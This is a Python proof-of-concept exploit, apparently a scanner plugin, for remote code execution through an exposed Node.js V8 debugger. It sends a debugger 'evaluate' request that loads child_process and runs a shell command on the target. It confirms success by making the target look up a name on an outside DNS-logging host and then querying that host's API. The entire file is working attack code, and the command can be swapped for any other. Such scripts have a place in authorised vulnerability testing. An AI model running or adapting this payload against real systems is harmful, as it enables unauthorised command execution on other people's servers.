# coding:utf-8
# author:nearg1e

''' poc for nodejs v8 debugger remote code execute '''

import socket
import string
import random
import time
from config import is_port_open
try:
    import urllib2
except Exception as e:
    import urllib.request as urllib2


def build_payload(cmd=""):
        payload = u'''{
            "seq": 1,
            "type": "request",
            "command": "evaluate",
            "arguments": {
                "expression": "(function(){var require=global.require||global.process.mainModule.constructor._load;if(!require)return;var exec=require(\\"child_process\\").exec;function execute(command,callback){exec(command,function(error,stdout,stderr){callback(stdout)})}execute(\\"''' + cmd + '''\\",console.log)})()",
                "global": true,
                "maxStringLength": -1
            }
        }'''
        data = u"Content-Length: {}\r\n\r\n".format(len(payload)) + payload
        return data.encode()


def dnslog_check(hash_str):
    url = "http://dnslog.yoyostay.top/api/dns/devil/{}/".format(hash_str)
    # url = "http://{}:8088/{}".format(server, hash_str)
    try:
        content = urllib2.urlopen(url, timeout=5).read()
    except Exception:
        return False
    else:
        if 'True' in content:
            return True
    return False


def random_str(length):
    pool = string.digits + string.ascii_lowercase
    return "".join(random.choice(pool) for _ in range(length))


# @is_port_open
def verify(ip, port=80, name=None, timeout=10,types='ip'):
    info = {
        "url": "http://{}:{}".format(ip, port),
        "vuln_name": "nodejs debugger rce",
        "severity": "high",
        "proof": ""
    }
    if types != 'ip':
        return
    socket.setdefaulttimeout(timeout)
    server = "devil.dns.yoyostay.top"
    check_str = random_str(16)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))
        command = "nslookup {}.{}".format(check_str, server)
        sock.send(build_payload(command))
    except Exception:
        pass
    else:
        time.sleep(2)
        info["proof"] = "{}.devil.dns.yoyostay.top".format(check_str)
        if dnslog_check(check_str):
            return info


if __name__ == '__main__':
    print(verify("127.0.0.1", 5858, 10))
